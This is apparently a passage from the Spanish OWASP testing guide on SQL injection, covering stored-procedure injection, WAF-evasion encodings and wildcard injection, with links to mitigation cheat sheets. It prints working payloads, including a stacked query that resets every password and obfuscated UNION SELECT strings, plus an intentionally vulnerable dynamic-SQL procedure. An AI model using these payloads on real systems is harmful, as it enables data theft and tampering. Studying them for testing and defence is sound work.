#### Inyección en procedimientos almacenados

Al utilizar SQL dinámico dentro de un procedimiento almacenado, la aplicación debe sanear adecuadamente la entrada del usuario para eliminar el riesgo de inyección de código. Si no se sanea, el usuario podría introducir código SQL malicioso que se ejecutaría dentro del procedimiento almacenado.

Considera el siguiente procedimiento almacenado de SQL Server:

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

Entrada del usuario:

```sql
anyusername or 1=1'
anypassword
```

Este procedimiento no sanea la entrada, por lo que el valor devuelto puede mostrar un registro existente con estos parámetros.

> Este ejemplo podría parecer poco probable porque utiliza SQL dinámico para iniciar sesión, pero considera una consulta dinámica para generar informes en la que el usuario selecciona las columnas que quiere ver. En este escenario, el usuario podría insertar código malicioso y poner en peligro los datos.

Considera el siguiente procedimiento almacenado de SQL Server:

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

Entrada del usuario:

```sql
1 from users; update users set password = 'password'; select *
```

Esto hará que se ejecute el informe y se actualicen todas las contraseñas de los usuarios.

#### Explotación automatizada

La mayoría de las situaciones y técnicas presentadas aquí se pueden llevar a cabo automáticamente con diversas herramientas. En este artículo, el evaluador puede encontrar información sobre cómo realizar auditorías automatizadas con [SQLMap](https://sqlmap.org/).

### Técnicas para eludir la detección de firmas de inyección SQL

Estas técnicas se utilizan para eludir defensas como los firewalls de aplicaciones web (WAF) o los sistemas de prevención de intrusiones (IPS). Consulta también [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### Espacios en blanco

Eliminar espacios o añadirlos de forma que no afecten a la instrucción SQL. Por ejemplo:

```sql
or 'a'='a'

or 'a'  =    'a'
```

Añadir caracteres especiales, como un salto de línea o una tabulación, que no cambien la ejecución de la instrucción SQL. Por ejemplo:

```sql
or
'a'=
        'a'
```

#### Bytes nulos

Utiliza un byte nulo (%00) antes de cualquier carácter que bloquee el filtro.

Por ejemplo, si el atacante puede inyectar la siguiente instrucción SQL:

`' UNION SELECT password FROM Users WHERE username='admin'--`

al añadir bytes nulos quedaría así:

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### Comentarios SQL

Añadir comentarios SQL en línea también puede ayudar a que la instrucción SQL sea válida y a eludir el filtro de inyección SQL. Considera como ejemplo esta inyección SQL:

`' UNION SELECT password FROM Users WHERE name='admin'--`

Al añadir comentarios SQL en línea, quedaría así:

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### Codificación URL

Utiliza la [codificación URL en línea](https://meyerweb.com/eric/tools/dencoder/) para codificar la instrucción SQL:

`' UNION SELECT password FROM Users WHERE name='admin'--`

La codificación URL de la instrucción de inyección SQL será:

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Codificación de caracteres

La función Char() se puede utilizar para sustituir caracteres del inglés. Por ejemplo, char(114,111,111,116) significa root.

`' UNION SELECT password FROM Users WHERE name='root'--`

Al aplicar Char(), la instrucción de inyección SQL será:

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### Concatenación de cadenas

La concatenación divide las palabras clave SQL y elude los filtros. La sintaxis de concatenación varía según el motor de base de datos. Considera el motor MS SQL como ejemplo:

`select 1`

La instrucción SQL sencilla se puede modificar de la siguiente manera mediante la concatenación:

`EXEC('SEL' + 'ECT 1')`

#### Codificación hexadecimal

La técnica de codificación hexadecimal utiliza valores hexadecimales para sustituir los caracteres de la instrucción SQL original. Por ejemplo, `root` se puede representar como `726F6F74`.

`Select user from users where name = 'root'`

La instrucción SQL que utiliza el valor HEX será:

`Select user from users where name = 726F6F74`

o

`Select user from users where name = unhex('726F6F74')`

#### Declarar variables

Declara la instrucción de inyección SQL en una variable y ejecútala.

Por ejemplo, la siguiente instrucción de inyección SQL:

`Union Select password`

Define la instrucción SQL en la variable `SQLivar`:

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Expresión alternativa de 'or 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### Inyección de comodines SQL

La mayoría de los dialectos SQL admiten comodines para un solo carácter (normalmente "`?`" o "`_`") y para varios caracteres (normalmente "`%`" o "`*`"), que se pueden utilizar en consultas con el operador `LIKE`. Incluso si se utilizan controles adecuados (como parámetros o instrucciones preparadas) para protegerse contra ataques de inyección SQL, podría ser posible inyectar comodines en las consultas.

Por ejemplo, si una aplicación web permite a los usuarios introducir un código de descuento durante el proceso de pago y comprueba si existe en la base de datos mediante una consulta como `SELECT * FROM discount_codes WHERE code LIKE ':code'`, introducir el valor `%` (que se insertaría en lugar del parámetro `:code`) coincidiría con todos los códigos de descuento.

Esta técnica también se podría utilizar para averiguar los códigos de descuento exactos mediante consultas cada vez más específicas (como `a%`, `b%`, `ba%`, etc.).

## Mitigación

- Para proteger la aplicación frente a vulnerabilidades de inyección SQL, consulta la [hoja de trucos para prevenir la inyección SQL](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).
- Para proteger el servidor SQL, consulta la [hoja de trucos de seguridad de bases de datos](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).

Para obtener información general sobre la seguridad de la validación de entrada, consulta la [hoja de trucos de validación de entrada](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

## Herramientas

- [Cadenas de fuzzing para inyección SQL (de la herramienta wfuzz) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [Bernardo Damele A. G.: sqlmap, herramienta automática de inyección SQL](https://sqlmap.org/)
- [Muhaimin Dzulfakar: MySqloit, herramienta de apropiación mediante inyección MySql](https://github.com/dtrip/mysqloit)
- [Inyección SQL - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Referencias

- [A05:2025 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
- [Inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection)
- [Inyección SQL](https://www.w3schools.com/sql/sql_injection.asp)

Se han creado páginas de la Guía de pruebas específicas para las siguientes tecnologías y DBMS:

- [Oracle](05.1-Oracle.md)
- [MySQL](05.2-MySQL.md)
- [SQL Server](05.3-SQL_Server.md)
- [PostgreSQL](05.4-PostgreSQL.md)
- [MS Access](05.5-MS_Access.md)
- [NoSQL](05.6-NoSQL_Injection.md)
- [ORM](05.7-ORM_Injection.md)
- [Del lado del cliente](05.8-Client-side.md)

### Documentos técnicos

- [Victor Chapela: "Advanced SQL Injection"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley: "More Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva: "Blinded SQL Injection"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [PortSwigger: "SQL Injection Cheat Sheet"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Kevin Spett from SPI Dynamics: "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek) and "Suphot Boonchamnan": "Beyond SQLi: Obfuscate and Bypass"](https://www.exploit-db.com/papers/17934/)
- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](https://blog.checkpoint.com/latest-sql-injection-trends/)

### Documentación sobre vulnerabilidades de inyección SQL en productos

- [Anatomy of the SQL injection in Drupal's database comment filtering system SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)